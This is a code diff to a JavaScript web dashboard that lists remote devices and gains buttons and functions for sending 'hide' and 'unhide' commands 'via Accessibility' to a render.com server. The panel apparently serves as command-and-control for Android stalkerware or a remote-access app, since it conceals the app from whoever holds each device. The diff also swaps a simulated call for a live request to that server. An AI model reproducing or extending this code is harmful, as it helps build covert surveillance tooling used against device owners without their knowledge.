@@ -234,13 +234,32 @@ const app = {
             const cardStyle = isRecent ? '' : 'opacity: 0.7; border-color: var(--text-muted);';
             const recentBadge = isRecent ? '' : '<div style="background: var(--text-muted); color: var(--dark); padding: 2px 8px; border-radius: 10px; font-size: 0.7rem; margin-top: 5px;">Old Data</div>';
             
+            // ✅ ACCESSIBILITY HIDE/UNHIDE BUTTONS
+            const accessibilityButtons = `
+                <div style="margin-top: 10px; display: flex; gap: 5px; flex-wrap: wrap;">
+                    <button class="accessibility-btn hide" 
+                            onclick="app.sendAccessibilityCommand('${deviceId}', 'hide', event)"
+                            style="flex: 1; background: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 5px; font-size: 0.8rem; cursor: pointer;">
+                        <i class="fas fa-eye-slash"></i>
+                        Hide via Accessibility
+                    </button>
+                    <button class="accessibility-btn unhide" 
+                            onclick="app.sendAccessibilityCommand('${deviceId}', 'unhide', event)"
+                            style="flex: 1; background: #28a745; color: white; border: none; padding: 8px 12px; border-radius: 5px; font-size: 0.8rem; cursor: pointer;">
+                        <i class="fas fa-eye"></i>
+                        Unhide via Accessibility
+                    </button>
+                </div>
+            `;
+            
             // ✅ HIDE/UNHIDE BUTTON
             const hideButton = `
                 <div style="margin-top: 10px;">
                     <button class="hide-btn ${isHidden ? 'unhide' : 'hide'}" 
-                            onclick="app.toggleDeviceHide('${deviceId}', ${isHidden}, event)">
+                            onclick="app.toggleDeviceHide('${deviceId}', ${isHidden}, event)"
+                            style="width: 100%; background: ${isHidden ? '#28a745' : '#dc3545'}; color: white; border: none; padding: 10px; border-radius: 5px; cursor: pointer;">
                         <i class="fas ${isHidden ? 'fa-eye' : 'fa-eye-slash'}"></i>
-                        ${isHidden ? 'Unhide' : 'Hide'}
+                        ${isHidden ? 'Unhide Device' : 'Hide Device'}
                     </button>
                 </div>
             `;
@@ -267,6 +286,7 @@ const app = {
                                     <i class="fas ${isCharging ? 'fa-bolt' : 'fa-check'}"></i>
                                     ${isCharging ? 'Charging' : 'Online'}
                                 </span>
+                                ${isHidden ? '<span style="color: #dc3545; margin-left: 5px;"><i class="fas fa-eye-slash"></i> Hidden</span>' : ''}
                             </span>
                         </div>
                         
@@ -301,6 +321,14 @@ const app = {
                             ID: ${deviceId.substring(0, 12)}...
                         </small>
                         ${recentBadge}
+                        
+                        <!-- ✅ ACCESSIBILITY BUTTONS -->
+                        <div style="margin: 10px 0; font-size: 0.8rem; color: #666; text-align: center;">
+                            <i class="fas fa-universal-access"></i> Accessibility Commands
+                        </div>
+                        ${accessibilityButtons}
+                        
+                        <!-- ✅ REGULAR HIDE BUTTON -->
                         ${hideButton}
                     </div>
                 </div>
@@ -318,7 +346,70 @@ const app = {
         }
     },
 
-    // ✅ NEW: TOGGLE HIDE/UNHIDE FUNCTION
+    // ✅ NEW: ACCESSIBILITY COMMAND SEND KARO
+    sendAccessibilityCommand: async function(deviceId, action, event) {
+        event.stopPropagation();
+        
+        try {
+            const confirmMessage = action === 'hide' ? 
+                `Send HIDE command to ${deviceId} via Accessibility?\n\nThis will use Accessibility Service to hide the app immediately.` :
+                `Send UNHIDE command to ${deviceId} via Accessibility?\n\nThis will use Accessibility Service to show the app immediately.`;
+            
+            if (!confirm(confirmMessage)) return;
+            
+            // ✅ SERVER KO ACCESSIBILITY COMMAND SEND KARO
+            const response = await this.sendAccessibilityRequest(deviceId, action);
+            
+            if (response.success) {
+                alert(`✅ ${action.toUpperCase()} command sent via Accessibility!\n\nDevice should respond immediately.`);
+                this.forceRefresh(); // UI refresh karo
+            } else {
+                alert(`❌ Failed to send ${action} command: ${response.message}`);
+            }
+            
+        } catch (error) {
+            console.error('❌ Accessibility command error:', error);
+            alert('❌ Error sending accessibility command');
+        }
+    },
+
+    // ✅ NEW: ACCESSIBILITY REQUEST TO SERVER
+    sendAccessibilityRequest: async function(deviceId, action) {
+        try {
+            console.log(`🎯 Sending accessibility ${action} for: ${deviceId}`);
+            
+            const response = await fetch('https://sukh-3qtl.onrender.com/api/accessibility-command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    device_id: deviceId,
+                    action: action,
+                    type: 'accessibility',
+                    timestamp: new Date().toISOString(),
+                    source: 'web_panel'
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error(`Server error: ${response.status}`);
+            }
+            
+            const result = await response.json();
+            console.log('📡 Accessibility response:', result);
+            return result;
+            
+        } catch (error) {
+            console.error('❌ Accessibility request error:', error);
+            return { 
+                success: false, 
+                message: error.message 
+            };
+        }
+    },
+
+    // ✅ UPDATED: TOGGLE HIDE/UNHIDE FUNCTION
     toggleDeviceHide: async function(deviceId, currentlyHidden, event) {
         event.stopPropagation(); // Card click se bachao
         
@@ -326,7 +417,7 @@ const app = {
             const action = currentlyHidden ? 'unhide' : 'hide';
             const confirmMessage = currentlyHidden ? 
                 `Are you sure you want to UNHIDE device ${deviceId}?` : 
-                `Are you sure you want to HIDE device ${deviceId}?\n\nApp will minimize on the device.`;
+                `Are you sure you want to HIDE device ${deviceId}?\n\nApp will be hidden on the device.`;
             
             if (!confirm(confirmMessage)) {
                 return;
@@ -348,19 +439,31 @@ const app = {
         }
     },
 
-    // ✅ NEW: SEND HIDE/UNHIDE REQUEST TO SERVER
+    // ✅ UPDATED: SEND HIDE/UNHIDE REQUEST TO SERVER
     sendHideRequest: async function(deviceId, action) {
         try {
-            // ✅ YEH TEMPORARY HAI - ACTUAL SERVER ENDPOINT BANANA HOGA
             console.log(`🎯 Sending ${action} request for device: ${deviceId}`);
             
-            // Simulate API call
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            const response = await fetch('https://sukh-3qtl.onrender.com/api/hide-device', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    device_id: deviceId,
+                    action: action,
+                    timestamp: new Date().toISOString()
+                })
+            });
             
-            return {
-                success: true,
-                message: `${action} request sent to device`
-            };
+            if (!response.ok) {
+                throw new Error(`Server error: ${response.status}`);
+            }
+            
+            const result = await response.json();
+            console.log('📡 Hide response:', result);
+            
+            return result;
             
         } catch (error) {
             console.error('❌ Hide request error:', error);
